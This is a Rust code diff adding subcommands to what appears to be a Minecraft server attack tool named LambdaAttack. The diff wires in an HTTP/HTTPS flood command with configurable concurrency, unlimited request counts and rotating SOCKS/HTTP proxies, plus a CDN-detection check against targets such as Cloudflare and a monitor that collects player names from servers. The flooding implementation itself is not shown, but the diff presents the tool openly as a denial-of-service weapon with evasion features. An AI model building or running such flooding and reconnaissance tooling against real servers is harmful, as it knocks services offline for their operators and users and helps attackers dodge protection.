@@ -6,9 +6,11 @@ use crate::attack::LambdaAttack;
 
 mod attack;
 mod bot;
+mod bot_connect;
 mod config;
 mod entity_location;
 mod factory;
+mod http_flood;
 mod logging;
 mod motd;
 mod options;
@@ -93,6 +95,67 @@ enum Commands {
         /// Server port
         #[arg(short, long, default_value_t = 25565)]
         port: u16,
+    },
+
+    /// Monitor server — periodically ping and collect player names
+    #[command(visible_alias = "m")]
+    Monitor {
+        /// Server hostname
+        host: Option<String>,
+
+        /// Server port
+        #[arg(short, long, default_value_t = 25565)]
+        port: u16,
+
+        /// Ping interval in seconds
+        #[arg(short = 't', long, default_value_t = 60)]
+        interval: u64,
+    },
+
+    /// Send HTTP/HTTPS flood (concurrent requests)
+    #[command(visible_alias = "h")]
+    Http {
+        /// Target URL
+        url: String,
+
+        /// HTTP method (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS)
+        #[arg(short, long, default_value = "GET")]
+        method: String,
+
+        /// Number of concurrent connections
+        #[arg(short = 'c', long, default_value_t = 50)]
+        concurrency: usize,
+
+        /// Total requests (0 = unlimited until Ctrl+C)
+        #[arg(short = 'n', long, default_value_t = 0)]
+        total: u64,
+
+        /// Request body (for POST/PUT/PATCH)
+        #[arg(short = 'b', long)]
+        body: Option<String>,
+
+        /// Delay between requests in ms
+        #[arg(short = 'd', long, default_value_t = 0)]
+        delay: u64,
+
+        /// Custom header, can be repeated: -H "Key: Value"
+        #[arg(short = 'H', long)]
+        header: Vec<String>,
+
+        /// Proxy URL (socks5://... or http://...), can be repeated
+        #[arg(short = 'P', long)]
+        proxy: Vec<String>,
+
+        /// Request timeout in seconds
+        #[arg(short = 't', long, default_value_t = 30)]
+        timeout: u64,
+    },
+
+    /// Check if a domain is behind a CDN (Cloudflare, etc.)
+    #[command(visible_alias = "c")]
+    Check {
+        /// Domain name to check
+        domain: String,
     },
 
     /// Manage system service (install/start/stop/status)
@@ -192,6 +255,67 @@ async fn main() -> anyhow::Result<()> {
             }
 
             motd::print_server_info(&result);
+        }
+
+        Some(Commands::Monitor { host, port, interval }) => {
+            let host = host.unwrap_or_else(|| "127.0.0.1".to_string());
+            let interval = std::time::Duration::from_secs(interval);
+
+            log::info!("Starting monitor for {}:{} (every {}s)", host, port, interval.as_secs());
+
+            // First query — get version info and set protocol_version
+            let result = motd::ping(&host, port, -1, false);
+            if result.info.motd.is_empty() {
+                log::error!("Server {}:{} is unreachable, aborting monitor", host, port);
+                eprintln!("Server is offline or unreachable.");
+                return Ok(());
+            }
+
+            motd::print_server_info(&result);
+            println!();
+            log::info!("Monitoring — press Ctrl+C to stop and save journal");
+
+            motd::monitor(&host, port, -1, interval).await?;
+        }
+
+        Some(Commands::Http { url, method, concurrency, total, body, delay, header, proxy, timeout }) => {
+            let http_method = http_flood::HttpMethod::from_str(&method)
+                .ok_or_else(|| anyhow::anyhow!("Invalid HTTP method: {}. Use GET, POST, PUT, DELETE, PATCH, HEAD, or OPTIONS", method))?;
+
+            // Parse custom headers
+            let headers: Vec<(String, String)> = header.iter()
+                .filter_map(|h| {
+                    h.split_once(':')
+                        .map(|(k, v)| (k.trim().to_string(), v.trim().to_string()))
+                })
+                .collect();
+
+            if headers.len() != header.len() {
+                log::warn!("Some headers could not be parsed (format: -H 'Key: Value')");
+            }
+
+            let cfg = http_flood::HttpFloodConfig {
+                url,
+                method: http_method,
+                concurrency,
+                total,
+                headers,
+                body,
+                delay_ms: delay,
+                proxies: proxy,
+                timeout_secs: timeout,
+            };
+
+            let snapshot = http_flood::start_flood(cfg).await;
+            match snapshot {
+                Ok(s) => http_flood::print_flood_summary(&s),
+                Err(e) => log::error!("HTTP flood failed: {e}"),
+            }
+        }
+
+        Some(Commands::Check { domain }) => {
+            let check = http_flood::check_cdn(&domain);
+            http_flood::print_cdn_check(&check);
         }
 
         Some(Commands::Service { action }) => {
